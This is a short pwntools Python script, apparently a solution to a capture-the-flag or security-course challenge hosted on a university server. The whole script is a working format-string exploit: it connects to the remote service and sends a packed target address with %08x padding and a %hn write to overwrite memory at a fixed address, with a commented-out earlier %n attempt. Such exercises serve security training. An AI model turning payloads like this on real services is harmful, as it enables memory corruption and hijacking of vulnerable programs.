from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22197

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

address = p32(0x0804a018)
#s.sendline(b'AAAA'+address+b'%08x '*6+b'%0134513756x '+b'%n')
s.sendline(address+b'%08x'*5+b'%033903x'+b'%hn')
result = s.recvall()
print(result)

